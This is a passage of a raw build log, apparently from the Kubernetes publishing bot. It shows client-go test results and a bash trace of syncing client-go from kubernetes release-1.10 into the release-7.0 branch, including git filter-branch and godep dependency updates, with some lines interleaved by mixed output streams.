\tk8s.io/client-go/informers/certificates\t[no test files]\n>\t?   \tk8s.io/client-go/informers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core\t[no test files]\n>\t?   \tk8s.io/client-go/informers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events\t[no test files]\n>\t?   \tk8s.io/client-go/informers/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions\t[no test files]\n>\t?   \tk8s.io/client-go/informers/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/internalinterfaces\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking\t[no test files]\n>\t?   \tk8s.io/client-go/informers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy\t[no test files]\n>\t?   \tk8s.io/client-go/informers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling\t[no test files]\n>\t?   \tk8s.io/client-go/informers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings\t[no test files]\n>\t?   \tk8s.io/client-go/informers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/informers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/admissionregistration/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/apps/v1beta2/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authentication/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/authorization/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/autoscaling/v2beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/batch/v2alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/certificates/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/core/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/events/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/extensions/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/networking/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/policy/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/rbac/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/scheduling/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/settings/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1alpha1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/kubernetes/typed/storage/v1beta1/fake\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/admissionregistration/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/apps/v1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authentication/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/authorization/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/autoscaling/v2beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/batch/v2alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/certificates/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/core/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/events/v1beta1\t[no test files]\n>\tok  \tk8s.io/client-go/listers/extensions/v1beta1\t0.488s\n>\t?   \tk8s.io/client-go/listers/imagepolicy/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/networking/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/policy/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/rbac/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/scheduling/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/settings/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1alpha1\t[no test files]\n>\t?   \tk8s.io/client-go/listers/storage/v1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/pkg/version\t[no test files]\n>\t?   \tk8s.io/client-go/plugin/pkg/auth/authenticator/token/oidc/testing\t[no test files]\n>\t?   \tk8s.io/client-go/plugin/pkg/client/auth\t[no test files]\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/azure\t0.507s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/gcp\t3.310s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/oidc\t0.478s\n>\tok  \tk8s.io/client-go/plugin/pkg/client/auth/openstack\t3.398s\n>\tok  \tk8s.io/client-go/rest\t0.907s\n>\t?   \tk8s.io/client-go/rest/fake\t[no test files]\n>\tok  \tk8s.io/client-go/rest/watch\t0.512s\n>\tok  \tk8s.io/client-go/scale\t0.796s\n>\t?   \tk8s.io/client-go/scale/fake\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/appsv1beta2\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/autoscalingv1\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsint\t[no test files]\n>\t?   \tk8s.io/client-go/scale/scheme/extensionsv1beta1\t[no test files]\n>\t?   \tk8s.io/client-go/testing\t[no test files]\n>\t?   \tk8s.io/client-go/third_party/forked/golang/template\t[no test files]\n>\tok  \tk8s.io/client-go/tools/auth\t0.390s\n>\tok  \tk8s.io/client-go/tools/cache\t10.305s\n>\tok  \tk8s.io/client-go/tools/cache/testing\t0.483s\n>\tok  \tk8s.io/client-go/tools/clientcmd\t0.614s\n>\tok  \tk8s.io/client-go/tools/clientcmd/api\t0.214s\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/latest\t[no test files]\n>\t?   \tk8s.io/client-go/tools/clientcmd/api/v1\t[no test files]\n>\tok  \tk8s.io/client-go/tools/leaderelection\t0.178s\n>\t?   \tk8s.io/client-go/tools/leaderelection/resourcelock\t[no test files]\n>\t?   \tk8s.io/client-go/tools/metrics\t[no test files]\n>\tok  \tk8s.io/client-go/tools/pager\t0.063s\n>\tok  \tk8s.io/client-go/tools/portforward\t0.791s\n>\tok  \tk8s.io/client-go/tools/record\t0.306s\n>\t?   \tk8s.io/client-go/tools/reference\t[no test files]\n>\tok  \tk8s.io/client-go/tools/remotecommand\t0.209s\n>\tok  \tk8s.io/client-go/transport\t0.108s\n>\t?   \tk8s.io/client-go/transport/spdy\t[no test files]\n>\tok  \tk8s.io/client-go/util/buffer\t0.171s\n>\tok  \tk8s.io/client-go/util/cert\t0.221s\n>\t?   \tk8s.io/client-go/util/cert/triple\t[no test files]\n>\tok  \tk8s.io/client-go/util/certificate\t0.138s\n>\tok  \tk8s.io/client-go/util/certificate/csr\t0.104s\n>\t?   \tk8s.io/client-go/util/exec\t[no test files]\n>\tok  \tk8s.io/client-go/util/flowcontrol\t5.310s\n>\t?   \tk8s.io/client-go/util/homedir\t[no test files]\n>\tok  \tk8s.io/client-go/util/integer\t0.013s\n>\tok  \tk8s.io/client-go/util/jsonpath\t0.080s\n>\tok  \tk8s.io/client-go/util/retry\t0.123s\n>\tok  \tk8s.io/client-go/util/testing\t0.011s\n>\tok  \tk8s.io/client-go/util/workqueue\t0.298s\n>[31 Aug 18 23:47 UTC]: Successfully constructed release-6.0\n>[31 Aug 18 23:47 UTC]: /publish_scripts/construct.sh client-go release-1.10 release-7.0 apimachinery:release-1.10,api:release-1.10  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/client-go kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"\n>\t+ '[' '!' 12 -eq 12 ']'\n>\t+ REPO=client-go\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-7.0\n>\t+ DEPS=apimachinery:release-1.10,api:release-1.10\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/client-go\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ readonly SRC_BRANCH DST_BRANCH DEPS SOURCE_REMOTE SOURCE_REPO_ORG SOURCE_REPO_NAME BASE_PACKAGE SUBDIR IS_LIBRARY\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t\tFetching from orig+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>in.\n>\t\tC+ echo 'Cleaning up checkout.'\n>\t+ lgit rebase --abort\n>eaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>\t+ git branch -D release-7.0\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-7.0\n>\tS\tw+ echo 'Switching to origin/release-7.0.'\n>\t+ git branch -f release-7.0 origin/release-7.0\n>itching to origin/release-7.0.\n>\t+ git checkout -q release-7.0\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/client-go release-1.10 release-7.0 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.10,api:release-1.10 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/client-go\n>\t+ local src_branch=release-1.10\n>\t+ local dst_branch=release-7.0\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 23 = 0 ']'\n>\t++ git rev-parse HEAD\n>\t\t+ eScho 'Starting at existing release-7.0 tcommiat r745ca830039794f7b927b8a2c2a58dctc1e8ia0a72n.'g\n>\t+ g iat remote rm upstream\n>t existing release-7.0 commit 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.10\n>\tBranch upstream-branch set up to track remote branch release-1.10 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit c6403d766708622303a2822c38ccfbaf371bd5a8.\n>\t+ echo 'Checked out source commit c6403d766708622303a2822c38ccfbaf371bd5a8.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-7.0\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-7.0\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>\t++ git-find-merge b16193f435cefa70de14823738a2c5af3d99b7ca upstream/release-1.10\n>\t++ tail -1\n>\t+++ git rev-list 'b16193f435cefa70de14823738a2c5af3d99b7ca^1..upstream/release-1.10' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list b16193f435cefa70de14823738a2c5af3d99b7ca..upstream/release-1.10 --ancestry-path\n>\t+++ git rev-parse b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ local k_base_merge=b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>\t+ git branch -f filtered-branch-base b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t\tR+ echo 'Reewriting upstream branch release-1.10 to only include commits for staginwritg/src/k8s.io/client-go.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/client-go 'BUILD */BUILD BUiInLD.bazegl */BUILD.bazel Gopkg.toml' filtered-branch  filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local suubdirectory=staging/srcp/ks8s.io/client-go\n>\t+trea mlocal 'recursive_delete_pattern=BUILD */BUILD BUILD.b abzelr a*/BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='gintc rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p hin  '\"r${pateternsl[@]}e\"'\n>\t+a index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ sei-ndex_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' 1'\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo &&.echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/client-go -- filtered-b1ranch filtered-branch-b0a se\n>to only include commits for staging/src/k8s.io/client-go.\n>\tRunning git filter-branch ...\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=01c4e03b3aefaec8bd8e6dc7c446680e02b4d4e3\n>\t++ git log --first-parent --format=%H --reverse 01c4e03b3aefaec8bd8e6dc7c446680e02b4d4e3..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-7.0.'\n>\t+ git checkout -q release-7.0\n>\tChecking out branch release-7.0.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ '[' 745ca830039794f7b927b8a2c2a58dcc1e8a0a72 '!=' 745ca830039794f7b927b8a2c2a58dcc1e8a0a72 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.10,api:release-1.10 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.10,api:release-1.10 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.10,api:release-1.10\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>\t++ git-find-merge b16193f435cefa70de14823738a2c5af3d99b7ca upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'b16193f435cefa70de14823738a2c5af3d99b7ca^1..upstream-branch' --first-parent\n>\t+++ git rev-list b16193f435cefa70de14823738a2c5af3d99b7ca..upstream-branch --ancestry-path\n>\t+++ git rev-parse b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ local k_last_kube_merge=b16193f435cefa70de14823738a2c5af3d99b7ca\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-apimachinery-release-1.10\n>\tLooking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.\n>\t+ '[' -z e386b2658ed20923da8cc9250e552f082899a1ee ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee'\n>\t+ git checkout -q e386b2658ed20923da8cc9250e552f082899a1ee\n>\tChecking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.\n>\t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-api-release-1.10\n>\t+ '[' -z 0f11257a8a25954878633ebdc9841c67d8f83bdb ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 0f11257a8a25954878633ebdc9841c67d8f83bdb'\n>\t+ git checkout -q 0f11257a8a25954878633ebdc9841c67d8f83bdb\n>\tChecking out k8s.io/api to 0f11257a8a25954878633ebdc9841c67d8f83bdb\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t\t+R uecho 'Running godep save.'\n>\t+ godep save ./...\n>nning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-7.0 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-7.0 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n 